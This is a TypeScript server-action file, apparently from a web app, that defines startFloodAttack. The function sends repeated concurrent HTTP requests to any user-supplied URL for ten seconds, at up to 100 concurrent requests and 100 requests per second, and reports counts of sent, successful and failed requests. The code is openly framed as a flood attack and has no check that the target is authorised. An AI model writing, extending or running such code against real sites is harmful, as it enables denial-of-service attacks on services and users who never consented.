
"use server";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
}

const ATTACK_DURATION_SECONDS = 10;

const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];

export async function startFloodAttack(
  targetUrl: string,
  method: string,
  headersString?: string,
  body?: string,
  concurrency?: number, // Made optional for now, will default if not provided
  rate?: number // Made optional for now, will default if not provided
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Invalid target URL. Please include scheme (e.g., http:// or https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
  }
  
  const safeConcurrency = Math.min(concurrency ?? 10, 100); // Default to 10 if not provided
  const safeRate = Math.min(rate ?? 10, 100); // Default to 10 if not provided


  if (safeConcurrency <= 0 || safeRate <= 0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency and rate must be positive integers." };
  }

  const parsedHeaders: HeadersInit = {};
  if (headersString) {
    headersString.split('\\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
        }
      }
    });
  }

  const fetchOptions: RequestInit = {
    method: method.toUpperCase(),
    headers: parsedHeaders,
    signal: AbortSignal.timeout(5000) // Timeout for each request
  };

  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
    fetchOptions.body = body;
    // Ensure Content-Type is set if body is present and not already specified
    if (!parsedHeaders['Content-Type'] && !parsedHeaders['content-type']) {
        // Attempt to guess content type, default to application/json for non-empty body
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            parsedHeaders['Content-Type'] = 'text/plain';
        }
        fetchOptions.headers = parsedHeaders; // Re-assign headers if Content-Type was added
    }
  }


  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const startTime = Date.now();
  const endTime = startTime + ATTACK_DURATION_SECONDS * 1000;

  console.log(`Starting flood: ${method} ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${ATTACK_DURATION_SECONDS}s`);

  try {
    while (Date.now() < endTime) {
      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break;

        requestsInBatch.push(
          fetch(targetUrl, fetchOptions) 
            .then(response => {
              if (response.ok || (response.status >= 200 && response.status < 400)) {
                successful++;
              } else {
                failed++;
              }
            })
            .catch(() => {
              failed++;
            })
            .finally(() => {
              totalSent++;
            })
        );
      }
      
      await Promise.allSettled(requestsInBatch);

      if (Date.now() >= endTime) break;

      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
      
      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  } catch (e: any) {
    console.error("Flood attack error:", e);
    return { totalSent, successful, failed, error: e.message || "An unexpected error occurred during the flood." };
  } finally {
    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}`);
  }

  return { totalSent, successful, failed };
}
